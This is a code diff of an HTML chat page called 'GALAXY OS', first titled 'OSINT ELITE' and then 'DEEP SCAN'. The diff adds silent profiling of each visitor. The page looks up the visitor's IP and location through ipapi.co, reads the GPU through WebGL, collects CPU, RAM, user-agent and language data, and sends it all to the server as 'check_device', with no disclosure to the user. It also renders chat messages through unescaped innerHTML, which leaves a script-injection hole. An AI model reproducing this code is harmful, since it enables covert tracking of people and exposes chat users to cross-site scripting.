@@ -3,206 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GALAXY OS - V8 OSINT ELITE</title>
+    <title>GALAXY OS - DEEP SCAN</title>
     <style>
-        :root { --main-color: #a29bfe; --neon: 0 0 20px #6c5ce7; --bg-dark: rgba(10, 10, 20, 0.9); }
-        
-        body {
-            margin: 0; padding: 0; background: #000 url('https://w0.peakpx.com/wallpaper/521/633/HD-wallpaper-incandescent-stars-sky-galaxy.jpg') no-repeat center center fixed;
-            background-size: cover; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: white; height: 100vh; display: flex; overflow: hidden;
-        }
-
-        /* LOGIN OVERLAY */
-        #login-overlay {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000;
-            display: flex; align-items: center; justify-content: center; backdrop-filter: blur(30px);
-        }
-        .login-box { 
-            background: var(--bg-dark); padding: 40px; border-radius: 30px; 
-            border: 2px solid var(--main-color); text-align: center; box-shadow: var(--neon);
-            width: 320px; animation: glowPulse 3s infinite;
-        }
-        @keyframes glowPulse { 0% { box-shadow: 0 0 15px #6c5ce7; } 50% { box-shadow: 0 0 35px #6c5ce7; } 100% { box-shadow: 0 0 15px #6c5ce7; } }
-
-        /* INTERFACE */
-        #side-menu { width: 300px; background: rgba(0,0,0,0.85); backdrop-filter: blur(20px); border-right: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; }
-        #main-chat { flex: 1; display: flex; flex-direction: column; position: relative; }
-        #messages { flex: 1; overflow-y: auto; padding: 30px; list-style: none; scroll-behavior: smooth; }
-
-        .msg-card {
-            margin-bottom: 25px; padding: 18px; background: rgba(255, 255, 255, 0.06);
-            border-radius: 20px; max-width: 85%; border-left: 5px solid var(--main-color);
-            backdrop-filter: blur(12px); animation: slideIn 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28);
-        }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
-
-        .user-header { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
-        .mini-pp { width: 45px; height: 45px; border-radius: 12px; border: 2px solid var(--main-color); object-fit: cover; }
-        .name-tag { font-weight: 900; color: var(--main-color); text-shadow: 0 0 8px var(--main-color); font-size: 1.1em; }
-        .geo-tag { font-size: 0.65em; color: #00ff88; letter-spacing: 1px; text-transform: uppercase; display: block; }
-
-        
-        #form { display: flex; padding: 25px; background: rgba(0,0,0,0.95); gap: 15px; align-items: center; border-top: 1px solid rgba(255,255,255,0.1); }
-        #input { 
-            flex: 1; background: rgba(255,255,255,0.05); border: 2px solid var(--main-color); 
-            color: white; padding: 15px 25px; border-radius: 40px; outline: none; transition: 0.3s;
-        }
-        #input:focus { box-shadow: var(--neon); background: rgba(255,255,255,0.1); }
-
-        .btn { border: none; cursor: pointer; border-radius: 40px; font-weight: bold; transition: 0.3s; color: white; display: flex; align-items: center; justify-content: center; }
-        .btn-send { background: var(--main-color); padding: 0 30px; height: 50px; box-shadow: var(--neon); }
-        .btn-util { background: rgba(255,255,255,0.1); width: 50px; height: 50px; font-size: 20px; }
-        .btn-util:hover { background: var(--main-color); transform: scale(1.1); }
-
-      
-        .chat-img { max-width: 100%; border-radius: 15px; margin-top: 12px; border: 1px solid rgba(255,255,255,0.2); transition: 0.3s; }
-        .chat-img:hover { transform: scale(1.02); }
-
-        
-        #call-window { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; }
-        #close-call { position: absolute; top: 20px; right: 20px; z-index: 10001; background: #ff4757; padding: 12px 25px; }
-
-       
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-thumb { background: var(--main-color); border-radius: 10px; }
+        :root { --main: #a29bfe; --glow: 0 0 20px #6c5ce7; }
+        body { margin: 0; background: #000 url('https://w0.peakpx.com/wallpaper/521/633/HD-wallpaper-incandescent-stars-sky-galaxy.jpg') no-repeat center center fixed; background-size: cover; font-family: 'Consolas', monospace; color: white; height: 100vh; display: flex; overflow: hidden; }
+        #login-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 10000; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(20px); }
+        .login-box { background: rgba(10,10,20,0.95); padding: 40px; border-radius: 20px; border: 1px solid var(--main); text-align: center; box-shadow: var(--glow); width: 320px; }
+        #side-menu { width: 280px; background: rgba(0,0,0,0.9); border-right: 1px solid rgba(255,255,255,0.1); display: flex; flex-direction: column; }
+        #main-chat { flex: 1; display: flex; flex-direction: column; }
+        #messages { flex: 1; overflow-y: auto; padding: 20px; list-style: none; }
+        .msg-card { margin-bottom: 20px; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 10px; border-left: 3px solid var(--main); animation: slide 0.2s ease; }
+        @keyframes slide { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        .user-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
+        .mini-pp { width: 40px; height: 40px; border-radius: 5px; border: 1px solid var(--main); object-fit: cover; }
+        .name-tag { font-weight: bold; color: var(--main); }
+        .geo-info { font-size: 0.65em; color: #00ff88; display: block; line-height: 1.2; }
+        #form { display: flex; padding: 20px; background: #000; gap: 10px; border-top: 1px solid #222; }
+        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 12px; border-radius: 5px; outline: none; }
+        .btn { border: none; cursor: pointer; background: var(--main); color: white; font-weight: bold; padding: 0 20px; border-radius: 5px; }
+        #monitor { padding: 15px; font-size: 0.7em; color: #666; border-top: 1px solid #222; }
     </style>
 </head>
 <body>
 
     <div id="login-overlay">
         <div class="login-box">
-            <h1 style="letter-spacing: 4px; color: var(--main-color);">GALAXY OS</h1>
-            <p style="font-size: 0.7em; color: gray; margin-bottom: 25px;">SCANNING NETWORK PERIMETER...</p>
-            
-            <input type="text" id="login-name" placeholder="Pseudo Pilote..." style="width: 100%; padding: 14px; margin-bottom: 20px; border-radius: 12px; border: 1px solid #444; background: #111; color: white; box-sizing: border-box;">
-            
-            <label style="color: #aaa; font-size: 0.8em; display: block; margin-bottom: 10px;">Photo de Profil (Fichier) :</label>
-            <input type="file" id="login-pp-file" accept="image/*" style="margin-bottom: 25px; font-size: 0.8em; color: #666; width: 100%;">
-            
-            <button class="btn btn-send" onclick="enterGalaxy()" style="width: 100%; height: 55px;">DÉCOLLAGE</button>
+            <h2 style="color:var(--main); letter-spacing: 5px;">GALAXY OS</h2>
+            <p style="font-size: 0.6em; color: gray;">SCANNING SYSTEM... WAIT</p>
+            <input type="text" id="login-name" placeholder="IDENTIFIANT..." style="width:100%; padding:12px; margin-bottom:15px; border-radius:5px; border:1px solid #333; background:#000; color:white;">
+            <input type="file" id="login-pp-file" accept="image/*" style="margin-bottom:20px; font-size:0.7em; color:#555; width:100%;">
+            <button class="btn" onclick="enterGalaxy()" style="width:100%; height:45px;">INITIALISATION</button>
         </div>
     </div>
 
     <div id="side-menu">
-        <div style="padding: 40px 20px; text-align: center; background: linear-gradient(180deg, rgba(108, 92, 231, 0.1), transparent);">
-            <img src="" id="my-avatar" style="width: 100px; height: 100px; border-radius: 20px; border: 3px solid var(--main-color); box-shadow: var(--neon); object-fit: cover; display: none;">
-            <h2 id="my-name-display" style="margin: 20px 0 5px 0;"></h2>
-            <div id="my-location-display" style="font-size: 0.7em; color: #00ff88; font-weight: bold;"></div>
+        <div style="padding:30px; text-align:center; border-bottom: 1px solid #222;">
+            <img src="" id="my-avatar" style="width:80px; height:80px; border-radius:10px; border:2px solid var(--main); object-fit: cover; display:none;">
+            <h3 id="my-name-display" style="margin-top:15px; font-size:1em;"></h3>
         </div>
-        <div style="padding: 20px; font-size: 0.7em; color: gray; border-top: 1px solid rgba(255,255,255,0.05);">
-            🛰️ SYSTÈME ACTIF : CONNECTÉ TGRM
+        <div id="monitor">
+            <p id="mon-ip">IP: SCANNING...</p>
+            <p id="mon-loc">LOC: SCANNING...</p>
+            <p id="mon-hw">HW: SCANNING...</p>
         </div>
     </div>
 
     <div id="main-chat">
-        <div id="call-window">
-            <button id="close-call" class="btn" onclick="endCall()">QUITTER L'APPEL</button>
-            <iframe id="call-iframe" src="" style="width: 100%; height: 100%; border: none;" allow="camera; microphone; fullscreen; display-capture"></iframe>
-        </div>
-
         <ul id="messages"></ul>
-
         <form id="form">
-            <label class="btn btn-util" title="Envoyer une image">
-                📎 <input type="file" id="msg-file" accept="image/*" style="display: none;" onchange="sendFile(this)">
-            </label>
-            
-            <button type="button" class="btn btn-util" onclick="startCall()" title="Lancer un appel vidéo">📞</button>
-            
-            <input id="input" autocomplete="off" placeholder="Entrer une transmission..." />
-            
-            <button type="submit" class="btn btn-send">ENVOYER</button>
+            <input id="input" autocomplete="off" placeholder="TRANSMISSION..." />
+            <button type="submit" class="btn">SEND</button>
         </form>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let userProfile = { name: "", pp: "", geo: {} };
+        let user = JSON.parse(localStorage.getItem('galaxy_v8')) || { name: "", pp: "", geo: {}, hardware: {} };
+
+        window.onload = () => { if(user.name) finalize(user.name, true); };
+
+        function getGPU() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+        }
 
         async function enterGalaxy() {
             const name = document.getElementById('login-name').value;
             const ppFile = document.getElementById('login-pp-file').files[0];
-
-            if(!name) return alert("Le pseudo est requis pour l'identification.");
+            if(!name) return;
 
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                userProfile.geo = {
-                    ip: data.ip,
-                    city: data.city,
-                    country: data.country_name,
-                    isp: data.org
-                };
-            } catch(e) {
-                userProfile.geo = { ip: "127.0.0.1", city: "Orbite", country: "Espace", isp: "Starlink" };
-            }
+                user.geo = await res.json();
+            } catch(e) { user.geo = { city: "Inconnu" }; }
+
+            user.hardware = {
+                cores: navigator.hardwareConcurrency,
+                ram: navigator.deviceMemory || "N/A",
+                gpu: getGPU(),
+                ua: navigator.userAgent,
+                lang: navigator.language
+            };
 
             if(ppFile) {
                 const reader = new FileReader();
-                reader.onload = (e) => {
-                    userProfile.pp = e.target.result;
-                    finalizeLogin(name);
-                };
+                reader.onload = (e) => { user.pp = e.target.result; finalize(name); };
                 reader.readAsDataURL(ppFile);
             } else {
-                userProfile.pp = "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif";
-                finalizeLogin(name);
+                user.pp = "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif";
+                finalize(name);
             }
         }
 
-        function finalizeLogin(name) {
-            userProfile.name = name;
+        function finalize(name, auto = false) {
+            user.name = name;
+            if(!auto) localStorage.setItem('galaxy_v8', JSON.stringify(user));
             document.getElementById('login-overlay').style.display = 'none';
-            
-            // UI Update
-            const av = document.getElementById('my-avatar');
-            av.src = userProfile.pp;
-            av.style.display = 'inline-block';
+            document.getElementById('my-avatar').src = user.pp;
+            document.getElementById('my-avatar').style.display = 'inline-block';
             document.getElementById('my-name-display').innerText = name;
-            document.getElementById('my-location-display').innerText = `📍 ${userProfile.geo.city}, ${userProfile.geo.country}`;
+            
+            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
+            document.getElementById('mon-loc').innerText = `LOC: ${user.geo.city}, ${user.geo.country_code}`;
+            document.getElementById('mon-hw').innerText = `HW: ${user.hardware.cores} CPU / ${user.hardware.ram}GB`;
 
-            socket.emit('check_device', {
-                name: name,
-                ip: userProfile.geo.ip,
-                city: userProfile.geo.city,
-                country: userProfile.geo.country,
-                isp: userProfile.geo.isp,
-                ram: navigator.deviceMemory || "N/A",
-                cores: navigator.hardwareConcurrency || "N/A"
-            });
-        }
-
-        function sendFile(input) {
-            const file = input.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    socket.emit('chat message', {
-                        text: e.target.result,
-                        name: userProfile.name,
-                        pp: userProfile.pp,
-                        city: userProfile.geo.city,
-                        isFile: true
-                    });
-                };
-                reader.readAsDataURL(file);
-                input.value = "";
-            }
+            socket.emit('check_device', user);
         }
 
         document.getElementById('form').onsubmit = (e) => {
             e.preventDefault();
             const input = document.getElementById('input');
             if(input.value) {
-                socket.emit('chat message', {
-                    text: input.value,
-                    name: userProfile.name,
-                    pp: userProfile.pp,
-                    city: userProfile.geo.city,
-                    isFile: false
-                });
+                socket.emit('chat message', { text: input.value, name: user.name, pp: user.pp, city: user.geo.city });
                 input.value = '';
             }
         };
@@ -210,44 +125,19 @@
         socket.on('chat message', (data) => {
             const li = document.createElement('li');
             li.className = 'msg-card';
-            
             li.innerHTML = `
                 <div class="user-header">
                     <img src="${data.pp}" class="mini-pp">
                     <div>
                         <span class="name-tag">${data.name}</span>
-                        <span class="geo-tag">🛰️ SIGNAL : ${data.city || 'Orbital'}</span>
+                        <span class="geo-info">📍 ${data.city}</span>
                     </div>
                 </div>
-                <div class="msg-body" style="word-break: break-word;">
-                    ${data.isFile ? `<img src="${data.text}" class="chat-img">` : `<span>${data.text}</span>`}
-                </div>
+                <div style="font-size:0.9em;">${data.text}</div>
             `;
             document.getElementById('messages').appendChild(li);
             document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
         });
-
-        // . SYSTÈME D'APPEL
-        function startCall() {
-            const room = "GalaxyOS-" + Math.random().toString(36).substring(7);
-            const url = `https://meet.jit.si/${room}#config.startWithVideoMuted=false`;
-            document.getElementById('call-iframe').src = url;
-            document.getElementById('call-window').style.display = 'block';
-            
-            socket.emit('chat message', {
-                text: `📞 APPEL VIDÉO LANCÉ : ${url}`,
-                name: userProfile.name,
-                pp: userProfile.pp,
-                city: userProfile.geo.city,
-                isFile: false
-            });
-        }
-
-        function endCall() {
-            document.getElementById('call-window').style.display = 'none';
-            document.getElementById('call-iframe').src = '';
-        }
     </script>
 </body>
 </html>
-
